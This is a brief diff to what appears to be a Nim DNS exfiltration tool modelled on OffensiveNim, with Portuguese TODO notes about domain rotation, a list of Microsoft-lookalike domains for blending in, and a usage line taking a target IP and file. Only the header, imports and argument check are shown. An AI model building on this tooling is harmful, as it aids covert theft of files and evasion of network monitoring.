@@ -1,12 +1,14 @@
+# REF: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/dns_exfiltrate.nim
+
 import os, ndns, strutils
 
 #[
      TODO: 
         confirmar envio
         rotacionar dominios
-]#
 
-# domains = [".msn.windows.com", ".update.microsoft.com", ".client.wns.windows.com"]
+domains = [".msn.windows.com", ".update.microsoft.com", ".client.wns.windows.com"]
+]#
 
 if paramCount() < 3:
     echo "[!] Use: dnsx.exe <IP> <File> <Time between requests in ms>"
